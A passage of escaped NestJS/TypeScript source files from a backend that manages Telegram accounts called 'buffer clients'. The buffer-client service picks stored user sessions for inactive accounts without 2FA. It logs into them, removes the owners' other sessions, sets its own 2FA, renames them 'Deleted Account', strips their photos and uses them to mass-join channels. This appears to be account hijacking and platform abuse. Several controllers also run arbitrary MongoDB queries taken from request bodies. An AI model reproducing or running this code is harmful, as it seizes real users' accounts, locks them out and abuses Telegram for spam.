\"${mobile}\" not found`);\r\n        }\r\n        return deletedUser;\r\n    }\r\n\r\n    async search(filter: any): Promise<Client[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.archivedclientModel.find(filter).exec();\r\n    }\r\n\r\n    async checkArchivedClients() {\r\n        await this.telegramService.disconnectAll()\r\n        await sleep(2000);\r\n        const archivedClients = await this.findAll();\r\n\r\n        const clients = await this.clientService.findAll();\r\n        const clientIds = clients.map(client => client.mobile);\r\n\r\n        archivedClients.map(async (document) => {\r\n            if (!clientIds.includes(document.mobile)) {\r\n                try {\r\n                    await this.telegramService.createClient(document.mobile, true, false);\r\n                    await this.telegramService.updateUsername(document.mobile, '');\r\n                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\r\n                    await this.telegramService.deleteClient(document.mobile)\r\n                    await sleep(2000);\r\n                } catch (error) {\r\n                    console.log(document.mobile, \" :  false\");\r\n                    this.remove(document.mobile)\r\n                    await this.telegramService.deleteClient(document.mobile)\r\n                }\r\n            } else {\r\n                console.log(\"Number is a Active Client\")\r\n            }\r\n        })\r\n\r\n        return \"Triggered ArchiveClients check\"\r\n    }\r\n\r\n    async executeQuery(query: any): Promise<any> {\r\n        try {\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            return await this.archivedclientModel.find(query).exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n}\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\r\nimport { BufferClientService } from './buffer-client.service';\r\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\r\nimport { SearchBufferClientDto } from './dto/search-buffer- client.dto';\r\nimport { BufferClient } from './schemas/buffer-client.schema';\r\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\r\n\r\n@ApiTags('Buffer Clients')\r\n@Controller('bufferclients')\r\nexport class BufferClientController {\r\n  constructor(private readonly clientService: BufferClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\r\n    return this.clientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\r\n    return this.clientService.search(query);\r\n  }\r\n\r\n  @Get('joinChannelsForBufferClients')\r\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\r\n  async joinChannelsforBufferClients(): Promise<string> {\r\n    return this.clientService.joinchannelForBufferClients();\r\n  }\r\n\r\n  @Get('checkBufferClients')\r\n  @ApiOperation({ summary: 'Check Buffer Clients' })\r\n  async checkbufferClients(): Promise<string> {\r\n    this.clientService.checkBufferClients();\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Post('addNewUserstoBufferClients')\r\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\r\n  @ApiBody({ type: Object })\r\n  async addNewUserstoBufferClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\r\n    this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  async findAll(): Promise<BufferClient[]> {\r\n    return this.clientService.findAll();\r\n  }\r\n\r\n  @Get('SetAsBufferClient/:mobile')\r\n  @ApiOperation({ summary: 'Set as Buffer Client' })\r\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n  async setAsBufferClient(\r\n    @Param('mobile') mobile: string,\r\n  ) {\r\n    return await this.clientService.setAsBufferClient(mobile);\r\n  }\r\n\r\n  @Get(':mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\r\n    return this.clientService.findOne(mobile);\r\n  }\r\n\r\n  @Patch(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\r\n    return this.clientService.update(mobile, updateClientDto);\r\n  }\r\n\r\n  @Put(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\r\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\r\n  }\r\n\r\n  @Delete(':mobile')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  async remove(@Param('mobile') mobile: string): Promise<void> {\r\n    return this.clientService.remove(mobile);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiBody({ type: Object })\r\n  async executeQuery(@Body() query: object): Promise<any> {\r\n    try {\r\n      return await this.clientService.executeQuery(query);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { BufferClientService } from './buffer-client.service';\r\nimport { BufferClientController } from './buffer-client.controller';\r\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { ChannelsModule } from '../channels/channels.module';\r\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => UsersModule),\r\n    forwardRef(() => ActiveChannelsModule),\r\n    forwardRef(() => ClientModule),\r\n    forwardRef(() => ChannelsModule),\r\n    forwardRef(() => PromoteClientModule)\r\n ],\r\n  controllers: [BufferClientController],\r\n  providers: [BufferClientService],\r\n  exports: [BufferClientService]\r\n})\r\nexport class BufferClientModule { }\r\n","import { ChannelsService } from './../channels/channels.service';\r\nimport { Channel } from './../channels/schemas/channel.schema';\r\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\r\nimport { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';\r\nimport { TelegramService } from '../Telegram/Telegram.service';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { UsersService } from '../users/users.service';\r\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\r\nimport { fetchWithTimeout, parseError, ppplbot } from '../../utils';\r\nimport { ClientService } from '../clients/client.service';\r\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\r\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\r\n\r\n@Injectable()\r\nexport class BufferClientService {\r\n    private joinChannelMap: Map<string, Channel[]> = new Map();\r\n    private joinChannelIntervalId: NodeJS.Timeout;\r\n    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,\r\n        @Inject(forwardRef(() => TelegramService))\r\n        private telegramService: TelegramService,\r\n        @Inject(forwardRef(() => UsersService))\r\n        private usersService: UsersService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private activeChannelsService: ActiveChannelsService,\r\n        @Inject(forwardRef(() => ClientService))\r\n        private clientService: ClientService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private channelsService: ChannelsService,\r\n        @Inject(forwardRef(() => PromoteClientService))\r\n        private promoteClientService: PromoteClientService,\r\n    ) {}\r\n\r\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {\r\n        const newUser = new this.bufferClientModel(bufferClient);\r\n        return newUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<BufferClient[]> {\r\n        return this.bufferClientModel.find().exec();\r\n    }\r\n\r\n    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {\r\n        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (!user && throwErr) {\r\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n\r\n    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\r\n        const updatedUser = await this.bufferClientModel.findOneAndUpdate(\r\n            { mobile },\r\n            { $set: updateClientDto },\r\n            { new: true, upsert: true, returnDocument: 'after' }\r\n        ).exec();\r\n\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\r\n        }\r\n\r\n        return updatedUser;\r\n    }\r\n\r\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {\r\n        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (existingUser) {\r\n            console.log(\"Updating\")\r\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);\r\n        } else {\r\n            console.log(\"creating\")\r\n            return this.create(createOrUpdateUserDto as CreateBufferClientDto);\r\n        }\r\n    }\r\n\r\n    async remove(mobile: string): Promise<void> {\r\n        await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);\r\n        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();\r\n        if (result.deletedCount === 0) {\r\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\r\n        }\r\n    }\r\n    async search(filter: any): Promise<BufferClient[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.bufferClientModel.find(filter).exec();\r\n    }\r\n\r\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {\r\n        try {\r\n\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            const queryExec = this.bufferClientModel.find(query);\r\n            if (sort) {\r\n                queryExec.sort(sort);\r\n            }\r\n\r\n            if (limit) {\r\n                queryExec.limit(limit);\r\n            }\r\n\r\n            if (skip) {\r\n                queryExec.skip(skip);\r\n            }\r\n\r\n            return await queryExec.exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n\r\n    removeFromBufferMap(key: string) {\r\n        this.joinChannelMap.delete(key)\r\n    }\r\n    clearBufferMap() {\r\n        console.log(\"BufferMap cleared\")\r\n        this.joinChannelMap.clear()\r\n    }\r\n\r\n    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {\r\n        if (!this.telegramService.getActiveClientSetup()) {\r\n            console.log(\"Joining Channel Started\")\r\n            await this.telegramService.disconnectAll();\r\n            this.clearJoinChannelInterval();\r\n            await sleep(2000);\r\n            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\r\n            // const today = (new Date(Date.now())).toISOString().split('T')[0];\r\n            const clients = await this.bufferClientModel.find({ channels: { \"$lt\": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\r\n            if (clients.length > 0) {\r\n                for (const document of clients) {\r\n                    try {\r\n                        const client = await this.telegramService.createClient(document.mobile, false, false);\r\n                        console.log(\"Started Joining for : \", document.mobile)\r\n                        const channels = await client.channelInfo(true);\r\n                        console.log(\"Existing Channels Length : \", channels.ids.length);\r\n                        await this.update(document.mobile, { channels: channels.ids.length });\r\n                        let result = [];\r\n                        if (channels.canSendFalseCount < 50) {\r\n                            if (channels.ids.length < 220) {\r\n                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\r\n                            } else {\r\n                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\r\n                            }\r\n                            this.joinChannelMap.set(document.mobile, result);\r\n                            await this.telegramService.deleteClient(document.mobile);\r\n                        } else {\r\n                            client.leaveChannels(channels.canSendFalseChats)\r\n                        }\r\n                        // console.log(\"DbChannelsLen: \", result.length);\r\n                        // let resp = '';\r\n                        // this.telegramService.joinChannels(document.mobile, result);\r\n                    } catch (error) {\r\n                        await this.telegramService.deleteClient(document.mobile);\r\n                        parseError(error)\r\n                    }\r\n                }\r\n                this.joinChannelQueue();\r\n            }\r\n            console.log(\"Joining Channel Triggered Succesfully for \", clients.length);\r\n            return `Initiated Joining channels ${clients.length}`\r\n        } else {\r\n            console.log(\"ignored active check buffer channels as active client setup exists\")\r\n        }\r\n    }\r\n\r\n    async joinChannelQueue() {\r\n        const existingkeys = Array.from(this.joinChannelMap.keys())\r\n        if (existingkeys.length > 0) {\r\n            this.joinChannelIntervalId = setInterval(async () => {\r\n                const keys = Array.from(this.joinChannelMap.keys());\r\n                if (keys.length > 0) {\r\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\r\n                    for (const mobile of keys) {\r\n                        const channels = this.joinChannelMap.get(mobile);\r\n                        if (channels && channels.length > 0) {\r\n                            const channel = channels.shift();\r\n                            console.log(mobile, \" Pending Channels :\", channels.length)\r\n                            this.joinChannelMap.set(mobile, channels);\r\n                            try {\r\n                                await this.telegramService.createClient(mobile, false, false);\r\n                                console.log(mobile, \" Trying to join :\", channel.username);\r\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\r\n                            } catch (error) {\r\n                                await this.telegramService.deleteClient(mobile);\r\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `);\r\n                                if (error.errorMessage == 'CHANNELS_TOO_MUCH' || errorDetails.error == 'FloodWaitError') {\r\n                                    this.removeFromBufferMap(mobile)\r\n                                    const channels = await this.telegramService.getChannelInfo(mobile, true);\r\n                                    // await this.update(mobile, { channels: channels.ids.length });\r\n                                }\r\n                            }\r\n                            await this.telegramService.deleteClient(mobile);\r\n                        } else {\r\n                            this.joinChannelMap.delete(mobile);\r\n                        }\r\n                    }\r\n                } else {\r\n                    this.clearJoinChannelInterval()\r\n                }\r\n            }, 4 * 60 * 1000);\r\n        }\r\n    }\r\n\r\n    clearJoinChannelInterval() {\r\n        if (this.joinChannelIntervalId) {\r\n            clearInterval(this.joinChannelIntervalId);\r\n            this.joinChannelIntervalId = null;\r\n            setTimeout(() => {\r\n                this.joinchannelForBufferClients(false)\r\n            }, 30000);\r\n        }\r\n    }\r\n\r\n    async setAsBufferClient(\r\n        mobile: string,\r\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\r\n    ) {\r\n        const user = (await this.usersService.search({ mobile }))[0];\r\n        if (!user) {\r\n            throw new BadRequestException('user not found');\r\n        }\r\n        const isExist = await this.findOne(mobile, false)\r\n        if (isExist) {\r\n            throw new ConflictException('BufferClient already exist');\r\n        }\r\n        const clients = await this.clientService.findAll();\r\n        const clientMobiles = clients.map(client => client?.mobile);\r\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\r\n        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {\r\n            try {\r\n                const telegramClient = await this.telegramService.createClient(mobile, false)\r\n                await telegramClient.set2fa();\r\n                await sleep(15000)\r\n                await telegramClient.updateUsername('');\r\n                await sleep(3000)\r\n                await telegramClient.updatePrivacyforDeletedAccount();\r\n                await sleep(3000)\r\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n                // await sleep(3000)\r\n                // await telegramClient.deleteProfilePhotos();\r\n                // const channels = await this.telegramService.getChannelInfo(mobile, true)\r\n                // const bufferClient = {\r\n                //     tgId: user.tgId,\r\n                //     session: user.session,\r\n                //     mobile: user.mobile,\r\n                //     availableDate,\r\n                //     channels: channels.ids.length,\r\n                // }\r\n                // await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();\r\n            } catch (error) {\r\n                const errorDetails = parseError(error)\r\n                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n            }\r\n            await this.telegramService.deleteClient(mobile)\r\n            return \"Client set as buffer successfully\";\r\n        } else {\r\n            throw new BadRequestException(\"Number is a Active Client\")\r\n        }\r\n    }\r\n\r\n    async checkBufferClients() {\r\n        if (!this.telegramService.getActiveClientSetup()) {\r\n            await this.telegramService.disconnectAll()\r\n            await sleep(2000);\r\n            const bufferclients = await this.findAll();\r\n            let goodIds: string[] = [];\r\n            let badIds: string[] = [];\r\n            if (bufferclients.length < 70) {\r\n                for (let i = 0; i < 70 - bufferclients.length; i++) {\r\n                    badIds.push(i.toString())\r\n                }\r\n            }\r\n            const clients = await this.clientService.findAll();\r\n            const promoteclients = await this.promoteClientService.findAll();\r\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\r\n            const promoteclientIds = promoteclients.map(client => client.mobile);\r\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\r\n            for (const document of bufferclients) {\r\n                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {\r\n                    try {\r\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\r\n                        const me = await cli.getMe();\r\n                        if (me.username) {\r\n                            await this.telegramService.updateUsername(document.mobile, '');\r\n                            await sleep(2000)\r\n                        }\r\n                        if (me.firstName !== \"Deleted Account\") {\r\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\r\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\r\n                            await sleep(2000)\r\n                        }\r\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\r\n                        const hasPassword = await cli.hasPassword();\r\n                        if (!hasPassword) {\r\n                            console.log(\"Client does not have password\");\r\n                            badIds.push(document.mobile);\r\n                            // await this.remove(document.mobile);\r\n                        } else {\r\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\r\n                            // await this.bufferClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\r\n                            console.log(document.mobile, \" :  ALL Good\");\r\n                            goodIds.push(document.mobile)\r\n                        }\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                        await sleep(2000);\r\n                    } catch (error) {\r\n                        parseError(error);\r\n                        badIds.push(document.mobile);\r\n                        this.remove(document.mobile)\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    }\r\n                } else {\r\n                    console.log(\"Number is a Active Client\");\r\n                    goodIds.push(document.mobile)\r\n                    this.remove(document.mobile)\r\n                }\r\n            }\r\n            goodIds = [...goodIds, ...clientIds, ...promoteclientIds]\r\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\r\n            this.addNewUserstoBufferClients(badIds, goodIds);\r\n        } else {\r\n            console.log(\"ignored active check buffer channels as active client setup exists\")\r\n        }\r\n    }\r\n\r\n    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {\r\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\r\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\r\n        console.log(\"New buffer documents to be added: \", documents.length)\r\n        while (badIds.length > 0 && documents.length > 0) {\r\n            const document = documents.shift();\r\n            try {\r\n                try {\r\n                    const client = await this.telegramService.createClient(document.mobile, false);\r\n                    const hasPassword = await client.hasPassword();\r\n                    console.log(\"hasPassword: \", hasPassword);\r\n                    if (!hasPassword) {\r\n                        await client.removeOtherAuths();\r\n                        await client.set2fa();\r\n                        console.log(\"waiting for setting 2FA\");\r\n                        await sleep(30000);\r\n                        await client.updateUsername('');\r\n                        await sleep(3000)\r\n                        await client.updatePrivacyforDeletedAccount();\r\n                        await sleep(3000)\r\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n                        await sleep(3000)\r\n                        await client.deleteProfilePhotos();\r\n                        await sleep(2000);\r\n                        await this.telegramService.removeOtherAuths(document.mobile);\r\n                        const channels = await client.channelInfo(true)\r\n                        console.log(\"Inserting Document\");\r\n                        const bufferClient = {\r\n                            tgId: document.tgId,\r\n                            session: document.session,\r\n                            mobile: document.mobile,\r\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\r\n                            channels: channels.ids.length,\r\n                        }\r\n                        await this.create(bufferClient);\r\n                        await this.usersService.update(document.tgId, { twoFA: true })\r\n                        console.log(\"=============Created BufferClient=============\")\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                        badIds.pop();\r\n                    } else {\r\n                        console.log(\"Failed to Update as BufferClient has Password\");\r\n                        await this.usersService.update(document.tgId, { twoFA: true })\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    }\r\n                } catch (error) {\r\n                    parseError(error)\r\n                    await this.telegramService.deleteClient(document.mobile)\r\n                }\r\n            } catch (error) {\r\n                parseError(error)\r\n                console.error(\"An error occurred:\", error);\r\n            }\r\n            await this.telegramService.deleteClient(document.mobile)\r\n        }\r\n        setTimeout(() => {\r\n            this.joinchannelForBufferClients()\r\n        }, 2 * 60 * 1000);\r\n    }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport {  IsNumber, IsString } from 'class-validator';\r\n\r\nexport class CreateBufferClientDto {\r\n  @ApiProperty({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsString()\r\n  readonly tgId: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsString()\r\n  readonly mobile: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Date of the session',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsString()\r\n  readonly availableDate: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Session identifier',\r\n    example: 'session123',\r\n  })\r\n  @IsString()\r\n  readonly session: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels: number;\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\r\n\r\nexport class SearchBufferClientDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly tgId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly mobile?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'availableDate of the bufferClient',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly availableDate?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Session identifier',\r\n    example: 'session123',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly session?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels?: number;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\r\n\r\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type BufferClientDocument = BufferClient & Document;\r\n@Schema({ collection: 'bufferClients', versionKey: false, autoIndex: true,\r\n  timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})  // Specify the collection name here\r\nexport class BufferClient {\r\n  @Prop({ required: true})\r\n  tgId: string;\r\n\r\n  @Prop({ required: true, unique: true })\r\n  mobile: string;\r\n  \r\n  @Prop({ required: true })\r\n  session: string;\r\n\r\n  @Prop({ required: true })\r\n  availableDate: string;\r\n\r\n  @Prop({ required: true, type: Number })\r\n  channels: number;\r\n}\r\n\r\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\r\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { BuildService } from './build.service';\r\n\r\n@ApiTags('Build')\r\n@Controller('builds')\r\nexport class BuildController {\r\n  constructor(private readonly buildService: BuildService) {}\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get build data' })\r\n  async findOne(): Promise<any>{\r\n    return this.buildService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update build' })\r\n  @ApiBody({type: Object})\r\n  async update( @Body() updateClientDto: any): Promise<any> {\r\n    return this.buildService.update( updateClientDto);\r\n  }\r\n\r\n}\r\n","import { Module, Global } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { BuildService } from './build.service';\r\nimport { BuildController } from './build.controller';\r\nimport { BuildSchema } from './builds.schema';\r\nimport { NpointModule } from '../n-point/npoint.module';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    BuildModule,\r\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\r\n    NpointModule,\r\n  ],\r\n  providers: [BuildService],\r\n  controllers: [BuildController],\r\n  exports: [BuildModule],\r\n})\r\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { Build } from './builds.schema';\r\nimport { NpointService } from '../n-point/npoint.service';\r\n\r\n@Injectable()\r\nexport class BuildService {\r\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\r\n        private npointSerive: NpointService) {\r\n    }\r\n\r\n    async OnModuleInit() {\r\n        console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        const user = await this.buildModel.findOne({}).exec();\r\n        if (!user) {\r\n            throw new NotFoundException(`buildModel not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.buildModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        try {\r\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\r\n            console.log(\"Updated document successfully in npoint\")\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`buildModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose, { Document } from 'mongoose';\r\n\r\nexport type BuildDocument = Build & Document;\r\n\r\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\r\n    toJSON: {\r\n      virtuals: true,\r\n      transform: (doc, ret) => {\r\n        delete ret._id;\r\n      },\r\n    },})\r\nexport class Build {}\r\n\r\nexport const BuildSchema = SchemaFactory.createForClass(Build);\r\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\r\n\r\n","// src/channels/channels.controller.ts\r\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\r\nimport { ChannelsService } from './channels.service';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\r\nimport { SearchChannelDto } from './dto/search-channel.dto';\r\nimport { CreateChannelDto } from './dto/create-channel.dto';\r\nimport { UpdateChannelDto } from './dto/update-channel.dto';\r\nimport { Channel } from './schemas/channel.schema';\r\n\r\n@ApiTags('Channels')\r\n@Controller('channels')\r\nexport class ChannelsController {\r\n  constructor(private readonly channelsService: ChannelsService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new  channel' })\r\n  async create(@Body() createChannelDto: CreateChannelDto) {\r\n    return this.channelsService.create(createChannelDto);\r\n  }\r\n  @Post('createMultiple')\r\n  @ApiOperation({ summary: 'Create multiple channels' })\r\n  @ApiBody({ type: [CreateChannelDto] })\r\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\r\n    return this.channelsService.createMultiple(createChannelDtos);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search channels by filters' })\r\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\r\n    console.log(query);\r\n    return this.channelsService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all  channels' })\r\n  async findAll() {\r\n    return this.channelsService.findAll();\r\n  }\r\n\r\n  @Get(':channelId')\r\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async findOne(@Param('channelId') channelId: string) 